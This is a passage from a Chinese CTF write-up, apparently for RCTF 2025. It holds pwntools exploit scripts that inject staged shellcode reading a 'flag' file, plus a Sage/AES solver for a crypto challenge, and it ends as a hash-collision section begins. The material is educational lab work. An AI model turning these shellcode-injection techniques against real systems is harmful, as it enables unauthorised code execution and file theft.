</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rm</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;back</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>save</span><span class=p>(</span><span class=n>fn</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;back</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>text</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;back</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;asdf&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#notes()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>li2double</span><span class=p>(</span><span class=n>bt</span><span class=p>):</span> <span class=c1># long long int to double</span>
</span></span><span class=line><span class=cl>    <span class=n>float_value</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack</span><span class=p>(</span><span class=s1>&#39;!d&#39;</span><span class=p>,</span> <span class=n>bt</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>float_value</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>v</span> <span class=o>=</span> <span class=n>li2double</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=mh>0xD0E0A0D0B0E0E0F</span><span class=p>)[::</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>io</span><span class=p>,</span><span class=n>gdbscript</span><span class=o>=</span><span class=n>gdbscript</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;exit</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;input:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>v</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>pop rsi
</span></span></span><span class=line><span class=cl><span class=s1>pop rsi
</span></span></span><span class=line><span class=cl><span class=s1>pop rdx
</span></span></span><span class=line><span class=cl><span class=s1>pop rsi
</span></span></span><span class=line><span class=cl><span class=s1>pop rsi
</span></span></span><span class=line><span class=cl><span class=s1>pop rsi
</span></span></span><span class=line><span class=cl><span class=s1>syscall
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Make a choice:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;your code:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>sc</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#pause()</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x90</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mh>0x40</span> <span class=o>+</span> <span class=n>asm</span><span class=p>(</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>cat</span><span class=p>(</span><span class=s1>&#39;flag&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>itr</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=only_rev>only_rev</h2><p>Shellcode 改一下就行了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>syscall
</span></span></span><span class=line><span class=cl><span class=s1>xchg rcx,rsi
</span></span></span><span class=line><span class=cl><span class=s1>mov edx,esi
</span></span></span><span class=line><span class=cl><span class=s1>syscall
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Make a choice:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#gdb.attach(io,gdbscript=gdbscript)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;your code:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>sc</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#pause()</span>
</span></span><span class=line><span class=cl><span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x90</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mh>0x40</span> <span class=o>+</span><span class=n>asm</span><span class=p>(</span><span class=s1>&#39;mov rsp,rsi&#39;</span><span class=p>)</span><span class=o>+</span> <span class=n>asm</span><span class=p>(</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>cat</span><span class=p>(</span><span class=s1>&#39;flag&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=no_check_wasm>no_check_WASM</h2><p>赛后复现：https://flyyy.top/2025/11/17/rctf-2025-no_check_WASM/</p><h1 id=crypto>Crypto</h1><h2 id=suanp01y>SuanP01y</h2><p>GPT一把梭版本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>sage.all</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>md5</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=p>,</span> <span class=n>d</span> <span class=o>=</span> <span class=mi>16381</span><span class=p>,</span> <span class=mi>41</span>
</span></span><span class=line><span class=cl><span class=n>R</span><span class=o>.&lt;</span><span class=n>x</span><span class=o>&gt;</span> <span class=o>=</span> <span class=n>PolynomialRing</span><span class=p>(</span><span class=n>GF</span><span class=p>(</span><span class=mi>2</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>S</span><span class=o>.&lt;</span><span class=n>X</span><span class=o>&gt;</span> <span class=o>=</span> <span class=n>R</span><span class=o>.</span><span class=n>quo</span><span class=p>(</span><span class=n>x</span><span class=o>^</span><span class=n>r</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span>    <span class=c1># over GF(2): &#39;-&#39; == &#39;+&#39;</span>
</span></span><span class=line><span class=cl><span class=n>m</span> <span class=o>=</span> <span class=n>x</span><span class=o>^</span><span class=n>r</span> <span class=o>-</span> <span class=mi>1</span>               <span class=c1># i.e., x^r + 1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>hwt</span><span class=p>(</span><span class=n>p</span><span class=p>):</span> 
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>len</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>exponents</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>min_arc_len</span><span class=p>(</span><span class=n>exps</span><span class=p>,</span> <span class=n>n</span><span class=o>=</span><span class=n>r</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34; minimal cyclic interval length covering all exponents on Z_n &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>exps</span><span class=p>:</span> <span class=k>return</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>exps</span> <span class=o>=</span> <span class=nb>sorted</span><span class=p>(</span><span class=n>e</span> <span class=o>%</span> <span class=n>n</span> <span class=k>for</span> <span class=n>e</span> <span class=ow>in</span> <span class=n>exps</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>gaps</span> <span class=o>=</span> <span class=p>[</span> <span class=p>(</span><span class=n>exps</span><span class=p>[(</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span><span class=o>%</span><span class=nb>len</span><span class=p>(</span><span class=n>exps</span><span class=p>)]</span> <span class=o>-</span> <span class=n>exps</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=o>%</span> <span class=n>n</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>exps</span><span class=p>))</span> <span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>n</span> <span class=o>-</span> <span class=nb>max</span><span class=p>(</span><span class=n>gaps</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>in_window</span><span class=p>(</span><span class=n>p</span><span class=p>,</span> <span class=n>lim</span><span class=o>=</span><span class=n>r</span><span class=o>//</span><span class=mi>3</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>min_arc_len</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>exponents</span><span class=p>(),</span> <span class=n>r</span><span class=p>)</span> <span class=o>&lt;=</span> <span class=n>lim</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rotate_R</span><span class=p>(</span><span class=n>p</span><span class=p>,</span> <span class=n>s</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>%=</span> <span class=n>r</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>R</span><span class=p>((</span><span class=n>S</span><span class=p>(</span><span class=n>p</span><span class=p>)</span> <span class=o>*</span> <span class=p>(</span><span class=n>X</span><span class=o>**</span><span class=n>s</span><span class=p>))</span><span class=o>.</span><span class=n>lift</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>try_reconstruct_once</span><span class=p>(</span><span class=n>qR</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>r0</span><span class=p>,</span> <span class=n>r1</span> <span class=o>=</span> <span class=n>m</span><span class=p>,</span> <span class=n>qR</span>
</span></span><span class=line><span class=cl>    <span class=n>s0</span><span class=p>,</span> <span class=n>s1</span> <span class=o>=</span> <span class=n>R</span><span class=p>(</span><span class=mi>1</span><span class=p>),</span> <span class=n>R</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>t0</span><span class=p>,</span> <span class=n>t1</span> <span class=o>=</span> <span class=n>R</span><span class=p>(</span><span class=mi>0</span><span class=p>),</span> <span class=n>R</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>r1</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>qout</span><span class=p>,</span> <span class=n>rem</span> <span class=o>=</span> <span class=n>r0</span><span class=o>.</span><span class=n>quo_rem</span><span class=p>(</span><span class=n>r1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r0</span><span class=p>,</span> <span class=n>r1</span> <span class=o>=</span> <span class=n>r1</span><span class=p>,</span> <span class=n>rem</span>
</span></span><span class=line><span class=cl>        <span class=n>s0</span><span class=p>,</span> <span class=n>s1</span> <span class=o>=</span> <span class=n>s1</span><span class=p>,</span> <span class=n>s0</span> <span class=o>-</span> <span class=n>qout</span><span class=o>*</span><span class=n>s1</span>
</span></span><span class=line><span class=cl>        <span class=n>t0</span><span class=p>,</span> <span class=n>t1</span> <span class=o>=</span> <span class=n>t1</span><span class=p>,</span> <span class=n>t0</span> <span class=o>-</span> <span class=n>qout</span><span class=o>*</span><span class=n>t1</span>
</span></span><span class=line><span class=cl>        <span class=n>A</span><span class=p>,</span> <span class=n>B</span> <span class=o>=</span> <span class=n>r0</span><span class=p>,</span> <span class=n>t0</span>
</span></span><span class=line><span class=cl>        <span class=c1># weight + window heuristic</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>hwt</span><span class=p>(</span><span class=n>A</span><span class=p>)</span> <span class=o>==</span> <span class=n>d</span> <span class=ow>and</span> <span class=n>hwt</span><span class=p>(</span><span class=n>B</span><span class=p>)</span> <span class=o>==</span> <span class=n>d</span> <span class=ow>and</span> <span class=n>in_window</span><span class=p>(</span><span class=n>A</span><span class=p>)</span> <span class=ow>and</span> <span class=n>in_window</span><span class=p>(</span><span class=n>B</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>U</span> <span class=o>=</span> <span class=n>R</span><span class=p>((</span><span class=n>S</span><span class=p>(</span><span class=n>qR</span><span class=p>)</span> <span class=o>*</span> <span class=n>S</span><span class=p>(</span><span class=n>B</span><span class=p>))</span><span class=o>.</span><span class=n>lift</span><span class=p>())</span>       <span class=c1># q * B</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>hwt</span><span class=p>(</span><span class=n>U</span><span class=p>)</span> <span class=o>==</span> <span class=n>d</span> <span class=ow>and</span> <span class=n>A</span> <span class=o>!=</span> <span class=mi>0</span> <span class=ow>and</span> <span class=n>U</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>Delta</span> <span class=o>=</span> <span class=p>(</span><span class=n>U</span><span class=o>.</span><span class=n>exponents</span><span class=p>()[</span><span class=mi>0</span><span class=p>]</span> <span class=o>-</span> <span class=n>A</span><span class=o>.</span><span class=n>exponents</span><span class=p>()[</span><span class=mi>0</span><span class=p>])</span> <span class=o>%</span> <span class=n>r</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>rotate_R</span><span class=p>(</span><span class=n>A</span><span class=p>,</span> <span class=n>Delta</span><span class=p>)</span> <span class=o>==</span> <span class=n>U</span><span class=p>:</span>    <span class=c1># check alignment</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=n>A</span><span class=p>,</span> <span class=n>B</span><span class=p>,</span> <span class=n>Delta</span>
</span></span><span class=line><span class=cl>            <span class=c1># maybe swapped</span>
</span></span><span class=line><span class=cl>            <span class=n>U2</span> <span class=o>=</span> <span class=n>R</span><span class=p>((</span><span class=n>S</span><span class=p>(</span><span class=n>qR</span><span class=p>)</span> <span class=o>*</span> <span class=n>S</span><span class=p>(</span><span class=n>A</span><span class=p>))</span><span class=o>.</span><span class=n>lift</span><span class=p>())</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>hwt</span><span class=p>(</span><span class=n>U2</span><span class=p>)</span> <span class=o>==</span> <span class=n>d</span> <span class=ow>and</span> <span class=n>B</span> <span class=o>!=</span> <span class=mi>0</span> <span class=ow>and</span> <span class=n>U2</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>Delta</span> <span class=o>=</span> <span class=p>(</span><span class=n>U2</span><span class=o>.</span><span class=n>exponents</span><span class=p>()[</span><span class=mi>0</span><span class=p>]</span> <span class=o>-</span> <span class=n>B</span><span class=o>.</span><span class=n>exponents</span><span class=p>()[</span><span class=mi>0</span><span class=p>])</span> <span class=o>%</span> <span class=n>r</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>rotate_R</span><span class=p>(</span><span class=n>B</span><span class=p>,</span> <span class=n>Delta</span><span class=p>)</span> <span class=o>==</span> <span class=n>U2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=n>B</span><span class=p>,</span> <span class=n>A</span><span class=p>,</span> <span class=n>Delta</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rational_reconstruct</span><span class=p>(</span><span class=n>qR</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=n>try_reconstruct_once</span><span class=p>(</span><span class=n>qR</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>res</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>res</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>shift</span> <span class=o>=</span> <span class=n>r</span><span class=o>//</span><span class=mi>3</span> <span class=o>+</span> <span class=mi>1</span>  <span class=c1># 5461</span>
</span></span><span class=line><span class=cl>    <span class=n>qR_shift</span> <span class=o>=</span> <span class=n>rotate_R</span><span class=p>(</span><span class=n>qR</span><span class=p>,</span> <span class=n>shift</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=n>try_reconstruct_once</span><span class=p>(</span><span class=n>qR_shift</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>res</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>RuntimeError</span><span class=p>(</span><span class=s2>&#34;Rational reconstruction failed (unexpected).&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>A</span><span class=p>,</span> <span class=n>B</span><span class=p>,</span> <span class=n>Delta</span> <span class=o>=</span> <span class=n>res</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>A</span> <span class=o>=</span> <span class=n>rotate_R</span><span class=p>(</span><span class=n>A</span><span class=p>,</span> <span class=n>r</span> <span class=o>-</span> <span class=n>shift</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>A</span><span class=p>,</span> <span class=n>B</span><span class=p>,</span> <span class=n>Delta</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>hint_line</span><span class=p>,</span> <span class=n>ct_hex</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;output.txt&#34;</span><span class=p>,</span><span class=s2>&#34;r&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>splitlines</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>hint_str</span> <span class=o>=</span> <span class=n>hint_line</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;=&#34;</span><span class=p>,</span><span class=mi>1</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>qS</span> <span class=o>=</span> <span class=n>S</span><span class=p>(</span><span class=n>hint_str</span><span class=p>)</span>     <span class=c1># parse hint in S</span>
</span></span><span class=line><span class=cl><span class=n>qR</span> <span class=o>=</span> <span class=n>R</span><span class=p>(</span><span class=n>qS</span><span class=o>.</span><span class=n>lift</span><span class=p>())</span>    <span class=c1># canonical representative in R with deg &lt; r</span>
</span></span><span class=line><span class=cl><span class=n>C</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>ct_hex</span><span class=o>.</span><span class=n>strip</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>A</span><span class=p>,</span> <span class=n>B</span><span class=p>,</span> <span class=n>Delta</span> <span class=o>=</span> <span class=n>rational_reconstruct</span><span class=p>(</span><span class=n>qR</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>assert</span> <span class=n>gcd</span><span class=p>(</span><span class=n>B</span><span class=p>,</span> <span class=n>m</span><span class=p>)</span> <span class=o>==</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>k0</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>r</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>h0</span> <span class=o>=</span> <span class=n>S</span><span class=p>(</span><span class=n>B</span><span class=p>)</span> <span class=o>*</span> <span class=p>(</span><span class=n>X</span><span class=o>**</span><span class=n>k0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>key</span> <span class=o>=</span> <span class=n>md5</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>h0</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>pt</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=o>=</span><span class=n>key</span><span class=p>,</span> <span class=n>mode</span><span class=o>=</span><span class=n>AES</span><span class=o>.</span><span class=n>MODE_CTR</span><span class=p>,</span> <span class=n>nonce</span><span class=o>=</span><span class=sa>b</span><span class=s2>&#34;suanp01y&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>C</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>pt</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;RCTF{&#34;</span><span class=p>)</span> <span class=ow>and</span> <span class=n>pt</span><span class=o>.</span><span class=n>endswith</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;}&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;flag =&#34;</span><span class=p>,</span> <span class=n>pt</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;k0  =&#34;</span><span class=p>,</span> <span class=n>k0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=suanhash>SuanHash</h2><p>通过短消息学习状态差 Δs₁，再用 Δs₁ 补偿第二块，使两条长消息在最后一块完全一致，从而构造确定性哈希碰撞</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
